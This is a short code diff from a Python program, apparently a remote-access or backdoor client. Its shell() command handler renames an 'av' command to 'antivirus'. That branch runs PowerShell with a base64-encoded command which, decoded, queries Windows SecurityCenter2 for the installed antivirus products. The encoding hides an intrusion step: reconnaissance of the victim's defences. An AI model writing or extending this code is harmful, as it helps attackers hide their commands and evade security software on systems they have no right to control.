@@ -359,7 +359,7 @@ def shell():
             except:
                 pass
 
-        elif command == 'av':
+        elif command == 'antivirus':
             try:
                 execute = subprocess.run(['powershell', 'E', 'RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIAAiAHIAbwBvAHQAXABTAGUAYwB1AHIAaQB0AHkAQwBlAG4AdABlAHIAMgAiACAALQBDAGwAYQBzAHMAIABBAG4AdABpAFYAaQByAHUAcwBQAHIAbwBkAHUAYwB0AA=='], shell=True, stdout=subprocess.PIPE, 
                                          stderr=subprocess.PIPE,
